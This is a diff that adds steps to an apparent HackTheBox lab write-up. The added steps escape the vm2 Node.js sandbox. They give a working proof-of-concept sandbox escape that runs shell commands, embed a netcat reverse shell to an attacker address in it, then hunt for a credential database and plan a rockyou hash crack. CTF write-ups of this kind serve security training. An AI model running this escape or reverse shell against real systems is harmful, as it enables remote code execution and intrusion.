@@ -50,4 +50,99 @@ environments such as Node-JS.
 https://www.uptycs.com/blog/exploitable-vm2-vulnerabilities (the newest one --> 2023).
 ```
 
-4. 
+4. Also found a github POC.
+
+```
+https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d9e4426-3a8a-4331-8efd-6e217c3944e9)
+
+
+```txt
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+}
+`
+
+console.log(vm.run(code));
+```
+
+
+5. To test the POC, we can try by sending --> `ls ./`
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/edbefc30-e90b-43de-9bb7-1f2c1cd21182)
+
+
+6. Great it executes our bash command, hence let's put our reverse shell payload there.
+
+> succeed payload
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1337 >/tmp/f
+```
+
+> RESULT
+
+```txt
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1337 >/tmp/f');
+}
+`
+
+console.log(vm.run(code));
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6bfefadb-8436-41fa-9b1d-f3f59fd34bd2)
+
+
+7. Notice that there is a user named **joshua** and we can't cd there.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9c1ec6bd-8f41-47e6-b0ab-00071936ae8a)
+
+
+8. Now we need to enumerate dirs and files, our objective should be a config file or .db file.
+9. Long story short, found tickets.db at --> `/var/www/contacts`.
+
+> FOUND JOSHUA CRED
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/01d4894f-6888-49be-bc35-a6f23e924dd4)
+
+
+10. Let's crack the hash using rockyou.
